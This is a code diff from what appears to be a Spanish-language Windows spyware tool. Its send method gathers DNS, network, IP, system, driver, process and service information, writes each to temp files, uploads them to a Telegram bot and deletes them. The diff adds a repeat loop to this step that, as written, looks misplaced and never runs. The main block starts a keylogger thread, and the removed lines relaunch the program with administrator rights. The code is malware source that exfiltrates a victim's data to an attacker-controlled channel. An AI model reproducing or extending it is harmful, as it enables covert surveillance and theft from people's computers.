@@ -513,28 +513,33 @@ class PCInformation:
         return response
 
     def send(self):
-        bot = telepot.Bot(Config.TelegramBot().TOKEN)
-        chat_id = Config.TelegramBot().ID[0]
+        def init():
+            bot = telepot.Bot(Config.TelegramBot().TOKEN)
+            chat_id = Config.TelegramBot().ID[0]
 
-        data = {
-            "Información del DNS":      self.__display_dns(),
-            "Información de la RED":    self.__red_info(),
-            "Configuración del IP":     self.__ip_config(),
-            "Información del sistema":  self.__system_info(),
-            "Información de los controladores":   self.__driver_info(),
-            "Programas ejecutandose":    self.__taks_list(),
-            "Servicios ejecutandose":  self.__service_active()
-        }
-        paths = []
-        for name, value in data.items():
-            path = Config().TEMP +'\\' + name +'.txt'
-            paths.append(path)
-            Util().save_file(path, value)
+            data = {
+                "Información del DNS": self.__display_dns(),
+                "Información de la RED": self.__red_info(),
+                "Configuración del IP": self.__ip_config(),
+                "Información del sistema": self.__system_info(),
+                "Información de los controladores": self.__driver_info(),
+                "Programas ejecutandose": self.__taks_list(),
+                "Servicios ejecutandose": self.__service_active()
+            }
+            paths = []
+            for name, value in data.items():
+                path = Config().TEMP + '\\' + name + '.txt'
+                paths.append(path)
+                Util().save_file(path, value)
 
-            bot.sendChatAction(chat_id, 'typing')
-            bot.sendDocument(chat_id, open(path, 'rb'), Util().current_time())
-            time.sleep(5)
-            os.remove(path)
+                bot.sendChatAction(chat_id, 'typing')
+                bot.sendDocument(chat_id, open(path, 'rb'), Util().current_time())
+                time.sleep(5)
+                os.remove(path)
+
+            while (True):
+                init()
+                time.sleep(200)
 
 
 
@@ -553,11 +558,3 @@ if __name__ == '__main__':
 
     threading.Thread(target=Key().listen_key).start() if Config().Keylogger().ACTIVE else False
 
-
-    if is_admin():
-        # Code of your program here
-        print("ya eres admin prro")
-    else:
-        # Re-run the program with admin rights
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-        print("no sos admin pibe")
